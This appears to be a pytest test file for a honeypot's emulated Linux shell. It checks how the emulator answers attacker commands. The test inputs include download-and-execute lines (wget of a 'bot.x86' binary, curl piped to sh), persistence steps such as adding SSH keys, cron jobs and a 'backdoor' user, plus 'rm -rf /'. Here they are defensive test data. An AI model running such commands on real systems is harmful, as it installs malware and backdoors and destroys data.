import pytest

from honeypot.cmds import ExitSession
from honeypot.fakefs import FakeFileSystem
from honeypot.shell import Shell


@pytest.fixture
def sh():
    return Shell(FakeFileSystem("root", "srv", seed=7), "root", "srv", "203.0.113.5", seed=7)


def run(sh, line, decoy=False):
    return sh.execute(line, decoy=decoy)


def test_prompt_and_cd(sh):
    assert sh.prompt() == "root@srv:~# "
    assert run(sh, "cd /var/log") == ""
    assert sh.prompt() == "root@srv:/var/log# "
    assert "No such file" in run(sh, "cd /nope")
    assert run(sh, "pwd") == "/var/log\n"


def test_basic_recon(sh):
    assert run(sh, "whoami") == "root\n"
    assert run(sh, "id").startswith("uid=0(root)")
    assert "Linux srv 5.15.0-91-generic" in run(sh, "uname -a")
    assert "model name" in run(sh, "cat /proc/cpuinfo")
    assert "Ubuntu 22.04" in run(sh, "cat /etc/os-release")


def test_ls_variants(sh):
    plain = run(sh, "ls /")
    assert "etc" in plain and "root" in plain
    long_ = run(sh, "ls -la /root")
    assert long_.startswith("total ") and ".bash_history" in long_ and " .." in long_
    assert "No such file" in run(sh, "ls /missing")


def test_unknown_command(sh):
    assert run(sh, "frobnicate") == "-bash: frobnicate: command not found\n"


def test_exit_raises(sh):
    with pytest.raises(ExitSession):
        run(sh, "exit")


def test_chaining_and_pipes(sh):
    out = run(sh, "cd /tmp && pwd; echo done")
    assert out == "/tmp\ndone\n"
    assert run(sh, "cat /etc/passwd | grep root") == "root:x:0:0:root:/root:/bin/bash\n"
    assert run(sh, "cat /etc/passwd | wc -l").strip().isdigit()
    assert run(sh, "false || echo fallback") == "fallback\n"


def test_redirection_and_scripts(sh):
    run(sh, "echo '#!/bin/sh' > /tmp/x.sh")
    run(sh, "echo 'echo hi from script' >> /tmp/x.sh")
    assert "Permission denied" in run(sh, "./x.sh") or "No such file" in run(sh, "./x.sh")
    run(sh, "cd /tmp")
    assert "Permission denied" in run(sh, "./x.sh")
    run(sh, "chmod +x x.sh")
    assert run(sh, "./x.sh") == "hi from script\n"


def test_download_and_execute_flow(sh):
    out = run(sh, "cd /tmp && wget http://198.51.100.9/bot.x86 && chmod +x bot.x86 && ./bot.x86")
    assert "200 OK" in out and "saved" in out
    assert sh.fs.get("/tmp/bot.x86").executable
    assert "ELF 64-bit" in run(sh, "file /tmp/bot.x86")
    assert run(sh, "curl -s http://198.51.100.9/i.sh | sh") == ""


def test_env_and_variables(sh):
    run(sh, "export FOO=bar")
    assert run(sh, "echo $FOO") == "bar\n"
    assert "HOME=/root" in run(sh, "env")


def test_persistence_commands(sh):
    run(sh, "echo 'ssh-ed25519 AAAA test' >> /root/.ssh/authorized_keys")
    assert "ssh-ed25519" in sh.fs.read("/root/.ssh/authorized_keys")
    assert run(sh, "crontab -l") == "no crontab for root\n"
    run(sh, "echo '* * * * * /tmp/x' | crontab -")
    assert run(sh, "crontab -l") == "* * * * * /tmp/x\n"
    run(sh, "useradd -m backdoor")
    assert "backdoor:x:" in sh.fs.read("/etc/passwd")


def test_non_root_restrictions():
    fs = FakeFileSystem("deploy", "srv", seed=1)
    sh = Shell(fs, "deploy", "srv", "203.0.113.5", seed=1)
    assert sh.prompt() == "deploy@srv:~$ "
    assert "Permission denied" in run(sh, "cat /etc/shadow") or "Permission denied" in run(sh, "cat /root/.bash_history")
    assert "not in the sudoers" in run(sh, "sudo cat /etc/shadow")
    assert "Operation not permitted" in run(sh, "dmesg")


def test_decoy_mode_plants_and_reveals(sh):
    assert "backup_credentials" not in run(sh, "ls /root")
    out = run(sh, "ls -la /root", decoy=True)
    assert "backup_credentials.txt" in out
    assert "<decoy:" in run(sh, "cat /root/backup_credentials.txt")  # consistent after planting
    assert "--password=<decoy:backup>" in run(sh, "ps aux", decoy=True)
    assert "AWS_SECRET_ACCESS_KEY=<decoy:aws-secret>" in run(sh, "env", decoy=True)


def test_history_and_cleanup(sh):
    run(sh, "ls")
    assert "ls" in run(sh, "history")
    run(sh, "history -c")
    assert sh.history == []


def test_emulation_never_raises_on_garbage(sh):
    for line in ("ls -", "cat", "grep", "chmod", "cut -d", "find /etc -name", "ip", "''", "echo \"unterminated",
                 "| | |", ";;;", ">>", "cd ..; cd ..; cd ..; ls", "rm -rf /"):
        run(sh, line)


def test_process_and_network_tables(sh):
    assert "/usr/sbin/sshd" in run(sh, "ps aux")
    assert "0.0.0.0:22" in run(sh, "netstat -tulpn")
    assert "10.0.12.37" in run(sh, "ip a")
    assert "icmp_seq=4" in run(sh, "ping -c 4 8.8.8.8")
